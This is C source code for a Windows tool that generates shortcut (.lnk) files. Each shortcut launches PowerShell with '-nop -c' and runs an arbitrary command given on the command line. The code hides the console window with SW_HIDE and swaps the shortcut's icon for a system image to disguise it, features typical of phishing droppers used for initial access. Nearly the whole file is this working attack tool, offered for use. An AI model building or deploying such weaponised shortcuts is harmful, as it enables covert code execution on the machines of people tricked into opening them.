#define INITGUID // fix to IID_IShellLinkW undefined
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <windows.h>
#include <shobjidl.h>
#include <objbase.h>

#pragma comment(lib, "Ole32.lib");
#pragma comment(lib, "Shell32.lib");



int checkOutputPath(char *outputPath){

    FILE *f = fopen(outputPath, "w");

    if (f) {
        fclose(f);
        remove(outputPath);
        return 1;
    }

    return 0;

}



int createTheLNKArguments(HRESULT hr, IShellLinkW *pShellLink, char *arguments){

    //this set the path to the link, for now only execute cmd
    hr = pShellLink->lpVtbl->SetPath(pShellLink, L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");

    if (FAILED(hr)){
        printf("[-] ERROR: cannot setPath to lnk\n");
        return 1;
    }

    //change the format
    wchar_t wUserArgument[256];
    MultiByteToWideChar(CP_ACP, 0, arguments, -1, wUserArgument, 256);

    //arguments for command
    wchar_t wArguments[512];
    swprintf(wArguments, 512, L"-nop -c \"%S\"", wUserArgument);


    hr = pShellLink->lpVtbl->SetArguments(pShellLink, wArguments);
    if (FAILED(hr)) {
        printf("[-] ERROR: cannot setArguments to lnk\n");
        return 1;
    }

    //this is for not spawning for 1 sec at the beginning the cmd
    hr = pShellLink->lpVtbl->SetShowCmd(pShellLink, SW_HIDE);
    if (FAILED(hr)) {
        printf("[-] ERROR: cannot set show command\n");
        return 1;
    }

    return 0;
}



int changeToAbsolutePath(const char *outputfile, wchar_t *outputFileW) {
    char completePath[MAX_PATH];

    //convert the path to absolute path
    //if the path is absolutepath before here, nothing change 
    DWORD len = GetFullPathNameA(outputfile, MAX_PATH, completePath, NULL);
    if (len == 0 || len > MAX_PATH) {
        printf("[-] ERROR GetFullPathNameA failed\n");
        return 0;
    }

    //change to wchar_t*
    if (!MultiByteToWideChar(CP_ACP, 0, completePath, -1, outputFileW, MAX_PATH)) {
        printf("[-] ERROR MultiByteToWideChar failed\n");
        return 0;
    }

    return 1;
}



int createLNKFile(HRESULT hr, IShellLinkW *pShellLink, char *outputfile){
    IPersistFile *pPersistFile;
    hr = pShellLink->lpVtbl->QueryInterface(pShellLink, &IID_IPersistFile, (void **)&pPersistFile);
    if (FAILED(hr)) {
        printf("[-] ERROR with IpersistFile\n");
        return 1;
    }

    wchar_t wOutputFile[MAX_PATH];

    if (!changeToAbsolutePath(outputfile, wOutputFile)) {
        printf("[-] ERROR changing to absolute path\n");
        return 1;
    }

    wprintf(L"[+] Saved in: %ls\n", wOutputFile);

    //change second parameter for changing the icon https://windows10dll.nirsoft.net/imageres_dll.html
    hr = pShellLink->lpVtbl->SetIconLocation(pShellLink, L"C:\\Windows\\System32\\imageres.dll", 3);
    if (FAILED(hr)) {
        printf("[-] ERROR changing the icon\n");
    }

    hr = pPersistFile->lpVtbl->Save(pPersistFile, wOutputFile, TRUE);
    if (FAILED(hr)) {
        printf("[-] ERROR saving the lnk file HRESULT = 0x%lx\n", hr);
        return 1;
    }

    return 0;
}



int main(int argc, char *argv[]){

    //to-do: change this with params like "-o" and "-c"

    if(argc != 4){
        printf("Example of usage:\n\t%s <LOCAL/REMOTE> <OUTPUT_FILE> <CODE_EXECUTION>\n\n", argv[0]);
        return 1;
    }

    if(strcmp(argv[1], "LOCAL") == 0){
        if (!checkOutputPath(argv[2])){
            printf("[-] Could not open the specify path\n");
            return 1;
        }
    }else if(strcmp(argv[1], "REMOTE") != 0){
        //is not remote or local
        printf("[-] Not 'REMOTE' or 'LOCAL'\n");
        return 1;
    }

    //printf("argv output code = %s", argv[3]);

    //this is for COM (component object model)
    HRESULT hr = CoInitialize(NULL);

    if (FAILED(hr)) {
        printf("[-] Error launching COM: 0x%lx\n", hr);
        return 1;
    }

    IShellLinkW *pShellLink;

    hr = CoCreateInstance(
        &CLSID_ShellLink,         //class we want to create
        NULL,                     //not use aggregation
        CLSCTX_INPROC_SERVER,     //execute in the same process
        &IID_IShellLinkW,         //interface we want to use
        (void**)&pShellLink
    );

    if (FAILED(hr)) {
        printf("[-] Error launching IShellLink: 0x%lx\n", hr);
        CoUninitialize();
        return 1;
    }

    if(!createTheLNKArguments(hr, pShellLink, argv[3])){
        //created
        if(!createLNKFile(hr, pShellLink, argv[2])){
            //all good
            printf("[+] LNK created!!");
        }
    }

    //free the memory
    pShellLink->lpVtbl->Release(pShellLink);
    CoUninitialize();

    return 0;
}